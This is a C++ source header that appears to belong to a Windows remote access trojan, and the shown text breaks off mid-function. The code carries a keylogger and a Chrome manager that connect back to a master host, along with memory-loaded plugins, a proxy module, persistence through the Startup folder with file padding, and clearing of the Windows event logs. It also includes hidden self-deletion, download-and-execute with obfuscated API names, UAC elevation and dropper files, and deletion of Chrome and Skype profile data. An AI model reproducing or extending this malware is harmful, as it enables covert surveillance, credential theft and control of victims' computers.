#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "MemoryModule.h"
#include <STDLIB.H>
#include <shlobj.h>
#include <tlhelp32.h>
#include <string>
#include "InstallService.h"
#include "ChromeManager.h"
#include "KeyboardManager.h"
#include "keylog.h"
#include "ChatManager.h"
#include "ZipImplement.h"
#include <winioctl.h>   //Ӳ�̻����ļ�
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")

extern BOOL bisUnInstall;
extern DLL_INFO dll_info;
extern char MyServiceName[70];
extern BOOL MyDele_zc;	         // ��������
typedef BOOL (* PluginMe)(LPCTSTR strHost, UINT HostPort,LPBYTE lparam);
BOOL LoadFromMemory(LPVOID data,LPCTSTR lpszHost, UINT nPort,LPBYTE lpBuffer)
{	
	HMEMORYMODULE module;
	PluginMe myPluginMe;
	module = AAAFFFFFFOOOOOOOO(data);
	if (module == NULL)
	{
		goto exit;
	}
	myPluginMe = (PluginMe)IIIIIISDJFFFFFFFF(module, "PluginMe");
	myPluginMe(lpszHost,nPort,lpBuffer);
	KKKKKKKDEDAYEJJJJ(module);
exit:	
	if (data)
		VirtualFree(data,0,MEM_RELEASE);
	return 1;
}

DWORD WINAPI Loop_Plugin(LPVOID lparam)
{
	LoadFromMemory(lparam,CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort,NULL);
	return 0;
}

DWORD WINAPI Loop_ChatManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CChatManager	manager(&socketClient);	
	socketClient.run_event_loop();
	
	return 0;
}
typedef BOOL (* OpenProxy)(LPVOID lparam);
typedef BOOL (* CloseProxy)();
char bToken[99];

HMEMORYMODULE hmProxy = NULL;
BOOL WINAPI Loop_Proxy(CClientSocket * m_pClient)
{
	if ( hmProxy!= NULL)
	{
		return FALSE;
	}
	
	LPBYTE lpBuffer = m_pClient->m_DeCompressionBuffer.GetBuffer(1);
	UINT nSize = m_pClient->m_DeCompressionBuffer.GetBufferLen() - 1;
	
	m_gFunc.memset(bToken,0,sizeof(bToken));
	m_gFunc.memcpy(bToken,lpBuffer,99);
	
	nSize -= 99;
	
	LPBYTE data = new BYTE[nSize];
	m_gFunc.memcpy(data,lpBuffer + 99,nSize );
	
	hmProxy = AAAFFFFFFOOOOOOOO(data);
	if (hmProxy == NULL)
	{
		goto exit;
	}
	
	OpenProxy myOpenProxy;
	myOpenProxy = (OpenProxy)IIIIIISDJFFFFFFFF(hmProxy, "OpenProxy");
	myOpenProxy(bToken);
	KKKKKKKDEDAYEJJJJ(hmProxy);
	
exit:
	if (data)
		delete [] data;
	
	hmProxy = NULL;
	return 0;
}

BOOL StopProxy()
{
	if (hmProxy != NULL)
	{
		CloseProxy myCloseProxy;
		myCloseProxy = (CloseProxy)IIIIIISDJFFFFFFFF(hmProxy, "CloseProxy");
		myCloseProxy();
		return TRUE;
	}
	return FALSE;
}

// �ػ�
void ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	m_gFunc.ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

// ����
DWORD WINAPI Loop_Messagebox(LPVOID lParam)
{
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
	}MsgBox;
	
	m_gFunc.memcpy(&MsgBox,lParam,sizeof(MSGBOX));
	m_gFunc.MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);
	
	return -1;
}

//�ṹ��
struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //�ļ�����	
	WORD Enlarge;            //��װ����
}Start;

///////////////////////////////////////////////////////////////////////////////////
VOID Wj_OnButtonAdd(LPSTR Path)  //�ļ��Ӵ���  Path �ļ���
{
	HMODULE hDll;
	hDll = LoadLibrary("KERNEL32.dll");
	if(Start.Enlarge == 0)  //��װ������
		return ;
	
	
	int m_Size=Start.Enlarge;  //m_Size=10 ����10M
	DWORD dwSize = m_Size * 1024;
	DWORD iSize; 
	
	HANDLE hFile = CreateFile
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	if(hFile==INVALID_HANDLE_VALUE)  //ʧ��
		return;
	
	
	SetFilePointer(hFile,0,NULL,FILE_END);
    iSize = GetFileSize(hFile,NULL);  
	if((dwSize*1024)>iSize)  //�ж��ļ��Ƿ���� ��ֹ����˳����ε������
	{  
		
		DWORD dwBytes=NULL;
		CHAR Buffer[1024]={NULL};
		for (DWORD n=0;n<dwSize;n++)
		{
			if(n%1024==0){
				for (int x=0;x<1024;x++)
					Buffer[x]=(char)(rand()+x)%255;    //д�������������
			}
			
			WriteFile(hFile,Buffer,1024,&dwBytes,NULL);
		}
	}
	m_gFunc.CloseHandle(hFile);	
}

void WINAPI Loop_Start(LPVOID lParam)
{
	m_gFunc.memcpy(&Start,lParam,sizeof(START));
	////��ȡС��·��
	char	strInstallModule[MAX_PATH]; 
	m_gFunc.memset(strInstallModule, 0, sizeof(strInstallModule)); 
	m_gFunc.GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
	TCHAR   szPath[MAX_PATH];
	if (!m_gFunc.SHGetSpecialFolderPaths(NULL, szPath, CSIDL_STARTUP, FALSE))
	{
		return ;
	}
	char FileName[80];
	
	m_gFunc.wsprintfA(FileName,"%s.exe",Start.Startname);
	
	TCHAR buf[MAX_PATH], buf2[MAX_PATH];
	m_gFunc.wsprintfA(buf, "%s\\%s", szPath, FileName);
	
	if (m_gFunc.GetFileAttributes(buf) == -1)
	{
		m_gFunc.wsprintfA(buf2, "%s\\%s", szPath, FileName);
		m_gFunc.Sleep(100);
		m_gFunc.CopyFileA(strInstallModule,buf2,FALSE);//���������ļ�
		m_gFunc.MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		CreateDirectory(szPath, NULL);
		Wj_OnButtonAdd(buf2);  //�ļ�����
		m_gFunc.SetFileAttributes(buf2,Start.FileAttribute);
	}
} 
/////////////////////////////////////////////////////////////////////////////
// Get System Information
//�����־
void CleanEvent(BYTE bType)
{
	char *strEventName[] = {"Application", "Security", "System"};
	switch(bType)
	{
	case CLEAN_EVENT_ALL:
		break;
	default:
		return;
	}
	
	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

//�޸ı�ע ����� bUpGroup == FALSE Ϊ�޸ı�ע TRUE Ϊ�޸ķ���
void SetHostID(LPCTSTR lpBuffer,BOOL bUpGroup = FALSE)
{
	char strSubKey[MAX_PATH];
	m_gFunc.wsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", MyServiceName);
	
	char *str = "Remark";
	if (bUpGroup)
		str = "Group";
	WriteRegEx(HKEY_CURRENT_USER, 
		strSubKey, 
		str, 
		REG_SZ, 
		(char*)lpBuffer, 
		m_gFunc.strlen(lpBuffer), 
		1);	
}

void UnintallSelfApplication()
{
	// ���ý������ȼ�-ʵʱ��ʹ�������ڲ���ϵͳ���֮ǰ����
	m_gFunc.SetPriorityClass(m_gFunc.GetCurrentProcess(), 0x00000100);
	// �����߳����ȼ�-ʵʱ
	m_gFunc.SetThreadPriority(m_gFunc.GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	// ��ȡ��ǰ�������̣�exe��������·����Ҳ����ͨ��GetModuleFileName���������
	char szFile[MAX_PATH] = {0};
	GetModuleFileName(NULL, szFile, MAX_PATH);
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS, FALSE,m_gFunc.GetCurrentProcessId());
	DWORD dwSize = MAX_PATH;
	m_gFunc.QueryFullProcessImageName(hProcess, 0, szFile, &dwSize);
	//�޸�����Ϊһ��
	m_gFunc.SetFileAttributes(szFile,0x00000080);  //�����ļ�����
	// ֪ͨ��Դ��������ɾ�����������ļ�
	SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szFile, NULL);
	char szCommandLine[MAX_PATH + 10];
	m_gFunc.wsprintfA(szCommandLine, "/c del /q %s", szFile);
	// ������������̨����ִ��ɾ���ļ�ָ��
	m_gFunc.ShellExecute(NULL, "open", "cmd.exe", szCommandLine, NULL, SW_HIDE);
	// �˳���ǰ����
	ExitProcess(ERROR_SUCCESS);
}
void Rundll32Dll(char* p = NULL)
{
	if(MyDele_zc == 2)
	{
		//ɾ��������Ϣ
		NtUninstallService(MyServiceName);	 //ж�ط���
	}
	else
	{
		HKEY hKey1=NULL;
		HKEY hKey2=NULL;
		//ɾ��������Ϣ
		char Servi[]="SYSTEM\\CurrentControlSet\\Services";
		RegOpenKeyEx(HKEY_CURRENT_USER,Servi,0,KEY_ALL_ACCESS,&hKey2);
		WriteRegEx(HKEY_CURRENT_USER,Servi,MyServiceName,NULL,NULL,NULL,2);
		RegDeleteValue(hKey2,"Group");
		RegDeleteValue(hKey2,"Remark");
		RegDeleteValue(hKey2,"InstallTime");
		RegCloseKey(hKey2);
		//ɾ��ע���������Ϣ
		RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey1);
		RegDeleteValue(hKey1,"SVP7");
		RegCloseKey(hKey1);
	}
	//ɾ�����̼�¼
	TCHAR strRecordFile[MAX_PATH];
    m_gFunc.SHGetSpecialFolderPaths(NULL,strRecordFile,0x001c,FALSE);
	if (m_gFunc.PathFileExists(strRecordFile))
	{
		strcat(strRecordFile,"\\");
		strcat(strRecordFile,MyUpGroup);
		strcat(strRecordFile,".key");
	}
	else
	{
		PathStripToRoot(strRecordFile);
		strcat(strRecordFile,"Windows\\");
		strcat(strRecordFile,MyUpGroup);
		strcat(strRecordFile,".key");
	}
	m_gFunc.DeleteFile(strRecordFile);
	
	UnintallSelfApplication(); //��ɾ��ж��
	
	OSVERSIONINFO OSversion;
	OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	m_gFunc.GetVersionEx(&OSversion);
	
	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		if (OSversion.dwMajorVersion >= 6)
		{
			bisUnInstall = TRUE;
		}
	}
	// �˳���ǰ����
	ExitProcess(0);
}

bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	char	strTemp[MAX_PATH];
	char	*lpstrCat = NULL;
	m_gFunc.memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	char strResult[MAX_PATH] = {0}; //������
	if (strrchr(lpExt, ' '))
	{
		int nStrLen = m_gFunc.strlen(lpExt) - 1 ; //ԭʼ�ַ�������
		
		for(int i = nStrLen ; i > 0; i--)
		{
			if(lpExt[i] == ' ')
			{
				strncpy(strResult,lpExt, i );
				break;
			}
		}
	}
	else
		strcpy(strResult,lpExt);
	
	if(!ReadRegEx(HKEY_CLASSES_ROOT,strResult,0L,REG_SZ,strTemp,NULL,sizeof(strTemp),0))
		return false;
	
	m_gFunc.memset(lpSubKey, 0, sizeof(lpSubKey));
	m_gFunc.wsprintfA(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	m_gFunc.memset(strTemp, 0, sizeof(strTemp));
	char str[MAX_PATH] = {0};
	if(!ReadRegEx(HKEY_CLASSES_ROOT,lpSubKey,0L,REG_EXPAND_SZ,str,NULL,sizeof(str),0))
		return false;
	
	m_gFunc.ExpandEnvironmentStrings(str,strTemp,MAX_PATH);
	
	
	lpstrCat = m_gFunc.strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = m_gFunc.strstr(strTemp, "%1");
	if (lpstrCat == NULL)
	{
		m_gFunc.lstrcatA(strTemp, " ");
		m_gFunc.lstrcatA(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
				
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default"; 
	}else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}
	
	m_gFunc.CreateProcess(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	
	return true;
}
typedef struct 
{
	BYTE bToken;
	UINT nType;
	char lpCmdLine[MAX_PATH];
	char lpFileName[256];
}LOCALUP;

//�����ϴ�����
BOOL LocalLoad(LPBYTE lpBuffer, UINT nSize)
{
	LOCALUP LocaUp;
	m_gFunc.memcpy(&LocaUp,lpBuffer,sizeof(LOCALUP));
	char strOpenFile[MAX_PATH + 100] = {0};
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(LocaUp.lpFileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer + sizeof(LOCALUP), nSize - sizeof(LOCALUP) , &dwBytesWritten, NULL)) 
		return false;
	m_gFunc.CloseHandle(hFile); 
	
	
	if(m_gFunc.strlen(LocaUp.lpCmdLine)!=0)
		m_gFunc.wsprintfA(strOpenFile,"%s %s",LocaUp.lpFileName,LocaUp.lpCmdLine);
	else
		lstrcpy(strOpenFile,LocaUp.lpFileName);
	
	switch(LocaUp.nType)
	{
	case 0:
		OpenFile(strOpenFile,SW_SHOW);
		break;
	case 1:
		OpenFile(strOpenFile,SW_HIDE);
		break;
	case 2:
		break;
	case 3://���·����
		Rundll32Dll(strOpenFile);
		break;
	default:
		break;
	}
	
	return TRUE;
}
BOOL KillProcessFromName(CString strProcessName)  
{  
	//�������̿���(TH32CS_SNAPPROCESS��ʾ�������н��̵Ŀ���)  
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);  
	//PROCESSENTRY32���̿��յĽṹ��  
	PROCESSENTRY32 pe;  
	//ʵ������ʹ��Process32First��ȡ��һ�����յĽ���ǰ�����ĳ�ʼ������  
	pe.dwSize = sizeof(PROCESSENTRY32);  
	//�����IFЧ��ͬ:  
	//if(hProcessSnap == INVALID_HANDLE_VALUE)   ��Ч�ľ��  
	if(!Process32First(hSnapShot,&pe))  
	{  
		return FALSE;  
	}  
	//���ַ���ת��ΪСд  
	strProcessName.MakeLower();  
	//��������Ч  ��һֱ��ȡ��һ�����ѭ����ȥ  
	while (Process32Next(hSnapShot,&pe))  
	{
		//pe.szExeFile��ȡ��ǰ���̵Ŀ�ִ���ļ�����  
		CString scTmp = pe.szExeFile;  
		//����ִ���ļ���������Ӣ����ĸ�޸�ΪСд  
		scTmp.MakeLower();  
		//�Ƚϵ�ǰ���̵Ŀ�ִ���ļ����ƺʹ��ݽ������ļ������Ƿ���ͬ  
		//��ͬ�Ļ�Compare����0  
		if(!scTmp.Compare(strProcessName))  
		{
			//�ӿ��ս����л�ȡ�ý��̵�PID(������������е�PID)  
			DWORD dwProcessID = pe.th32ProcessID;  
			HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_TERMINATE,FALSE,dwProcessID);  
			m_gFunc.TerminateProcess(hProcess,0);  
			m_gFunc.CloseHandle(hProcess);  
			scTmp.ReleaseBuffer();
			strProcessName.ReleaseBuffer();  
			return TRUE;  
		}  
		scTmp.ReleaseBuffer();  
	}
	strProcessName.ReleaseBuffer();  
	return FALSE;  
}
//��UAC��ʾ����
BOOL LocalLoads(LPBYTE lpBuffer, UINT nSize)
{
	LOCALUP LocaUp;
	m_gFunc.memcpy(&LocaUp,lpBuffer,sizeof(LOCALUP));
	
	TCHAR Server[256];
	m_gFunc.SHGetSpecialFolderPaths(NULL,Server,0x002e,FALSE);
	m_gFunc.PathAddBackslash(Server);
	strcat(Server,"SVP7.exe");
	
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(Server,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile,lpBuffer + sizeof(LOCALUP), nSize - sizeof(LOCALUP) , &dwBytesWritten, NULL)) 
		return false;
	m_gFunc.CloseHandle(hFile);
	
	TCHAR Server1[260];
	m_gFunc.SHGetSpecialFolderPaths(NULL,Server1,0x002e,FALSE);
	m_gFunc.PathAddBackslash(Server1);
	strcat(Server1,"uac.exe");
	if(m_gFunc.PathFileExists(Server1))
	{
		if(OpenFile(Server1,SW_SHOW))
		{
			Sleep(1000);
			KillProcessFromName("cmd.exe");
		}
	}
	return TRUE;
}
BOOL uac(LPBYTE lpBuffer, UINT nSize)
{
	LOCALUP LocaUp;
	m_gFunc.memcpy(&LocaUp,lpBuffer,sizeof(LOCALUP));
	TCHAR Server[256];
	m_gFunc.SHGetSpecialFolderPaths(NULL,Server,0x002e,FALSE);
	m_gFunc.PathAddBackslash(Server);
	strcat(Server,"uac.exe");
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(Server,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer + sizeof(LOCALUP), nSize - sizeof(LOCALUP) , &dwBytesWritten, NULL)) 
		return false;
	m_gFunc.CloseHandle(hFile);
	
	return TRUE;
}
//ö�ٴ����Ƿ����
BOOL bFindWindow = FALSE;
BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{	
	if(!m_gFunc.IsWindowVisible(hwnd))
		return TRUE;
	
	char szClassName[1024]={0};
	m_gFunc.SendMessage(hwnd,WM_GETTEXT,1024,(LPARAM)szClassName);
	
	if (lstrlen(szClassName) == 0)
		return TRUE;
	
	char* lpBuffer = (char*)lParam;
	
	if (m_gFunc.strstr(strupr(szClassName),strupr(lpBuffer)) != NULL)
	{
		bFindWindow = TRUE;
		return FALSE;
	}
	
	return TRUE;
}

BOOL CheckWindow(LPBYTE lpBuffer,CClientSocket* m_pClient)
{
	m_gFunc.EnumWindows(EnumWindowsList, (LPARAM)(lpBuffer + 1));
	if (bFindWindow)
	{
		BYTE bToken = TOKEN_FIND_YES;
		m_pClient->Send(&bToken, 1);	
		return TRUE;
	}
	bFindWindow = FALSE;
	return FALSE;
}

BOOL CheckProcess(LPBYTE lpBuffer,CClientSocket* m_pClient)
{
	if (EnumProcesin((LPTSTR)lpBuffer + 1))
	{
		BYTE bToken = TOKEN_FIND_YES;
		m_pClient->Send(&bToken, 1);
		return TRUE;
	}
	return FALSE;
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (m_gFunc.strlen(lpszURL) == 0)
		return false;
	// System Ȩ���²���ֱ������shellexecute��ִ��
	char	*lpSubKey = "Applications\\iexplore.exe\\shell\\open\\command";
	char	strIEPath[MAX_PATH];
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	m_gFunc.memset(strIEPath, 0, sizeof(strIEPath));
	
	
	if(!ReadRegEx(HKEY_CLASSES_ROOT,lpSubKey,0L,REG_SZ,strIEPath,NULL,sizeof(strIEPath),0))
		return false;
	
	if (lstrlen(strIEPath) == 0)
		return false;
	
	lpstrCat = m_gFunc.strstr(strIEPath, "%1");
	if (lpstrCat == NULL)
		return false;
	
	lstrcpy(lpstrCat, lpszURL);
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}
	
	m_gFunc.CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return 0;
}
DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)//���̼�¼
{	
	
	CClientSocket	SocketClient;
	if (!SocketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CKeyboardManager	manager(&SocketClient);
	
	SocketClient.run_event_loop();
	
	return 0;
}

DWORD WINAPI Loop_Screen()
{	
	//��ȡ�ֱ���  
	int _cx = ::GetSystemMetrics(SM_CXSCREEN);   
	int _cy = ::GetSystemMetrics(SM_CYSCREEN);  
	
	//�޸ķֱ���  
	DEVMODE lpDevMode;  
	lpDevMode.dmBitsPerPel = 32;//ÿ�����ص�λ��  
	lpDevMode.dmPelsWidth = 1600;//��Ļ��ȣ����أ�  
	lpDevMode.dmPelsHeight = 900;//��Ļ�߶ȣ����أ�  
	lpDevMode.dmSize = sizeof(lpDevMode);  
	lpDevMode.dmFields =   
		DM_PELSWIDTH/*ʹ��dmPelsWidth��ֵ*/  
		|DM_PELSHEIGHT/*ʹ��dmPelsHeight��ֵ*/  
		|DM_BITSPERPEL/*ʹ��dmBitsPerPel��ֵ*/;  
	LONG result = ChangeDisplaySettings(&lpDevMode, 0);  
	if (result == DISP_CHANGE_SUCCESSFUL)  
	{  
		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRY��ʾ���޸��ǳ־õģ�����ע�����д������ص�����  
	}  
	else  
	{  
		ChangeDisplaySettings(NULL,0);  
	}  
	return 0;
}

bool OpenFile1(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
}

// ����ִ��
DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = m_gFunc.strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	m_gFunc.memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	
	char szFile[512] = {0};
	TCHAR szPath[MAX_PATH];
    m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,CSIDL_COMMON_DOCUMENTS,FALSE);
	strcat(szPath,"\\%s");
	m_gFunc.wsprintfA(szFile,szPath,lpFileName);
	
	DWORD(WINAPI *DOWNFILE) (LPCTSTR ,LPCTSTR, LPCTSTR ,DWORD, LPCTSTR);
	char tUyoF[] = {'u','r','l','m','o','n','.','d','l','l','\0'};
	char edtfl[] = {'U','R','L','D','o','w','n','l','o','a','d','T','o','F','i','l','e','A','\0'};
	(FARPROC&)DOWNFILE= GetProcAddress(LoadLibrary(tUyoF),edtfl);
	HRESULT hr = DOWNFILE(NULL,lpURL, szFile, 0, NULL);
	if (hr == S_OK)
	{
		if ( !CheckFileExist(szFile) )
			return false; //�ļ����سɹ��������ļ������ڣ��ܿ��ܱ�ɱ�������ɱ
    }
	else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
		return false;    //URL ����ȷ���ļ�����ʧ��	
	else
		return false; //�ļ�����ʧ�ܣ�����URL�Ƿ���ȷ
	
	HINSTANCE hNewExe = m_gFunc.ShellExecute(0,0,szFile,0,0,5);
	if ((DWORD)hNewExe <= 32)
	{
		OpenFile1(szFile,5);
	}
	return true;
}

BOOL UpdateServer(LPCTSTR lpURL)
{
	char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	
	if (lpFileName == NULL)
		return false;
	
	if (!http_get(lpURL, lpFileName)||!CheckFileExist(lpFileName))
		return false;
	
	Rundll32Dll(lpFileName);	
	return true;
}
//���ϵͳ�汾�Ƿ���Vista����ߵİ汾  
bool   IsOsVersionVistaOrGreater()  
{  
    OSVERSIONINFOEX    ovex;    
    //���ò����Ĵ�С�����ò��ж��Ƿ�ɹ�  
    ovex.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);  
    if( !m_gFunc.GetVersionEx(  (LPOSVERSIONINFO) (&ovex)  )  )  
    {  
        //printf("���ϵͳ�汾ʧ��\n");  
        return false;  
    }  
    //ͨ���汾�ţ��ж�����vista��֮��汾  
    if(ovex.dwMajorVersion > 5)  
    {  
        return true;   
    }  
    else  
    {  
        return false;  
    }  
} 
// void Win7Elevate_Privileges() //WIN7����Ȩ��
DWORD WINAPI Win7Elevate_Privileges(LPVOID lParam)
{
	char ModuleFileNamePath[MAX_PATH]={0};
	char *scEXEName; //����Ĳ���
	m_gFunc.GetModuleFileName(NULL,ModuleFileNamePath,MAX_PATH);
	scEXEName=ModuleFileNamePath;
	
	if(!IsOsVersionVistaOrGreater())  
		return 0;
	char szRundll32Path[MAX_PATH]={0};
	strcat(szRundll32Path,scEXEName);
	// 	OutputDebugString(szRundll32Path);
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = TEXT("runas");
	sei.lpFile = szRundll32Path;
	//	sei.lpParameters =/* (LPCTSTR)*/sCmdLine;//����
	sei.nShow = SW_SHOW;
	if(ShellExecuteEx(&sei))
		ExitProcess(0);
	return 0;
}
//void ReStartExp() // ����Exp
DWORD WINAPI ReStartExp(LPVOID lParam)
{
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE  hSnapshot=NULL; 
	hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
	PROCESSENTRY32 pe={sizeof(PROCESSENTRY32)};//֧��win7
	Process32First(hSnapshot,&pe); 
	do 
	{
		if(strcmpi(pe.szExeFile, "explorer.exe")==0)
		{
			HANDLE   hProcess; 
			hProcess=m_gFunc.OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID); 
			if   (hProcess) 
			{ 
				m_gFunc.TerminateProcess(hProcess,0);//�رս��� 
			} 
		} 
	}   
	while(Process32Next(hSnapshot,&pe)); 
	m_gFunc.CloseHandle(hSnapshot); 
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	return 0;
}
//���������
DWORD WINAPI Loop_ChromeManager(LPBYTE sRemote)          
{	
	KillProcessFromName("chrome.exe");
	m_gFunc.Sleep(1000);
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	
	CChromeManager	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}
bool RemoveDir(const char* szFileDir)

{
	std::string strDir = szFileDir;
	if (strDir.at(strDir.length()-1) != '\\')
		strDir += '\\';
	WIN32_FIND_DATA wfd;
	HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
	if (hFind == INVALID_HANDLE_VALUE)
		return false;
	do
	{
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (stricmp(wfd.cFileName,".") != 0 &&
				stricmp(wfd.cFileName,"..") != 0)
				RemoveDir( (strDir + wfd.cFileName).c_str());
		}
		else
		{
			m_gFunc.DeleteFile( (strDir + wfd.cFileName).c_str());
		}
	}
	while (FindNextFile(hFind,&wfd));
	FindClose(hFind);
	RemoveDirectory(szFileDir);
	return true;
}
DWORD WINAPI ReStartieqc(LPVOID lParam)
{
	m_gFunc.WinExec("cmd.exe /c RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255", SW_HIDE);
	return 0;
}
DWORD WINAPI ReStartieqc1(LPVOID lParam)//�ȸ�
{
	KillProcessFromName("chrome.exe");
	TCHAR   szPath[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL, szPath, CSIDL_STARTUP, FALSE);  
	CString strRes;
	AfxExtractSubString(strRes,szPath,2,'\\');
	
	CString aadir="C:\\Users\\"+strRes+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
	
	
	m_gFunc.Sleep(1000);
	RemoveDir(aadir);
	return 0;
}
DWORD WINAPI ReStartieqc2(LPVOID lParam)//skype
{
	KillProcessFromName("Skype.exe");
	TCHAR   szPath[MAX_PATH];
	m_gFunc.SHGetSpecialFolderPaths(NULL, szPath, CSIDL_STARTUP, FALSE);  
	CString strRes;
	AfxExtractSubString(strRes,szPath,2,'\\');
	
